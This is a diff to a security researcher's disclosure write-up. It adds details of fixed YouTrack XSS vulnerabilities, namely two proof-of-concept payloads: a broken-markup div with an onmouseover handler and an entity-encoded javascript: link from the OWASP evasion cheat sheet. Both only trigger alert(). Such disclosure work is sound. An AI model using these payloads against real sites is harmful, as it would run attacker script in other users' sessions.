@@ -111,11 +111,11 @@ I have found and reported markup sanitization related issues in: \
  _[TBA](#tba)_,
 [Gogs](#gogs), [Gitea](#gitea), [Redmine](#redmine),
 _[TBA 2](#tba-2)_,
-_[TBA 3](#tba-3)_,
+[YouTrack](#youtrack),
 [Upsource](#upsource),
 [JIRA](#jira).
 
-Of those, [TBA](#tba), [TBA 2](#tba-2), [TBA 3](#tba-3), and [Upsource](#upsource) issues are not related to unsanitized `class` atribute.
+Of those, [TBA](#tba), [TBA 2](#tba-2), [YouTrack](#youtrack), and [Upsource](#upsource) issues are not related to unsanitized `class` atribute.
 Note that the █████ ██████ █████ █████ ███████ ███ █████████████ — █████████ ████ ███ ███████ ████ ██████ ██ ████████ ██████, ███ ███████ ███████ █████████ ██████
 ████████████. ████ ███████ ███████ ████████ ████████████ ████████ ████, though, and ██████ ███ ██████ ███ ████ ██ ██ ████████ ███████ writeup.
 
@@ -282,34 +282,39 @@ TBA
 
 _Details TBA._
 
-### TBA 3
+### YouTrack
+
+_Fixed in: 2017.2.32524/2017.2.32529._
 
 The issues here are not related to `class` not being sanitized.
 
-![XSS](/media/tba3.xss.png)
+![XSS](/media/youtrack.xss.png)
 
-This project ha██████████████████████████████XSS██████████████████████ arbitrary JS code, ██████████████████████████████████████████████████████.
+This project had two different full-featured XSS vulnerabilities, with arbitrary JS code, achievable through issue comments (among other places).
 
-_Details TBA._
-
-#### Using██████████████
+#### Using broken markup
 
 PoC:
 ```html
-TBA
+{html}
+<div align='left" style="position:fixed;left:0;top:0;bottom:0;right:0;z-index:999" onmouseover=alert(&quot;xss&quot;);"'>
+</div>
+{html}
 ```
 
-#### ███████████████
+#### Unchecked links
 
-████████ ██████████ ████████.
+This one works only on click.
 
 PoC:
 ```html
-TBA
+{html}
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click me!</a>
+{html}
 ```
 
-Note that ██████████████████████████████████████████,
-███████████████ ████████████████████ ███████████.
+Note that the last PoC comes straight from the [cheatsheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet),
+which is widely known — they didn't check those.
 
 ### Upsource
 
@@ -433,6 +438,8 @@ a good one, send me a link, I will include that link here.
 ---
 
 Published (partially): 2017-04-13, 9:01 UTC. \
-Updated: _TBA_.
+Updated with _TBA_ disclosure: _TBA_.
+Updated with _TBA 2_ disclosure: _TBA_.
+Updated with YouTrack disclosure: 2017-04-25, 9:34 UTC.
 
 If you have any questions to me, contact me over Gitter ([@ChALkeR](https://gitter.im/ChALkeR)) or IRC (ChALkeR@freenode).
